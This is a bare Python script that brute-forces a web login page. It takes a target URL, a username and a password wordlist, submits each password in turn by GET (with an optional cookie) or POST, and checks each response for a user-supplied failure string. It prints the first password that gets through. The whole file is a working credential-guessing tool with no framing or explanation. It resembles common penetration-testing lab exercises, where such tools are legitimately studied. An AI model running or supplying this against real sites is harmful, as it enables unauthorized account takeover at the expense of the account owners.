
import requests
from termcolor import colored

url = input('-> Input Page URL: ')
username = input('-> Input Account Username to Bruteforce: ')
password_file = input('-> Input Password File To Use: ')
login_failed_string = input('-> Input String That Occurs When Login Fails: ')
cookie_value = input('Input Cookie Value(Optional): ')


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying with : ' + password), 'green'))
		data = {'username':username,'password':password,'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('-_- Succesfull Username: ==> ' + username), 'red'))
			print(colored(('-_- Succesfull Password: ==> ' + password), 'red'))
			exit()




with open(password_file, 'r') as passwords:
	cracking(username,url)

print('! No Passwords matched')


